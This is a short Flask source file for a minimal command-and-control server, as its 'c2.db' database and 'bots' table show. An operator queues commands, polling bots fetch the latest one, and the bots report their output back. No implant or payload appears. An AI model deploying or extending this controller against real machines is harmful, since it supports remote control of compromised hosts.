from flask import Flask, request, render_template
import sqlite3
import os

app = Flask(__name__)
DB = "c2.db"

def init_db():
    with sqlite3.connect(DB) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS bots (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            name TEXT,
                            output TEXT
                        )''')
        conn.execute('''CREATE TABLE IF NOT EXISTS commands (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            command TEXT
                        )''')

@app.route('/', methods=["GET"])
def index():
    with sqlite3.connect(DB) as conn:
        bots = conn.execute("SELECT * FROM bots ORDER BY id DESC").fetchall()
    return render_template("index.html", bots=bots)

@app.route('/send_command', methods=["POST"])
def send_command():
    command = request.form.get("command")
    with sqlite3.connect(DB) as conn:
        conn.execute("INSERT INTO commands (command) VALUES (?)", (command,))
    return "Command sent. <a href='/'>Back</a>"

@app.route('/get_command', methods=["GET"])
def get_command():
    with sqlite3.connect(DB) as conn:
        result = conn.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1").fetchone()
    return result[1] if result else ""

@app.route('/submit_output', methods=["POST"])
def submit_output():
    name = request.form.get("name")
    output = request.form.get("output")
    with sqlite3.connect(DB) as conn:
        conn.execute("INSERT INTO bots (name, output) VALUES (?, ?)", (name, output))
    return "OK"

if __name__ == '__main__':
    init_db()
    app.run(host='127.0.0.1', port=8080)
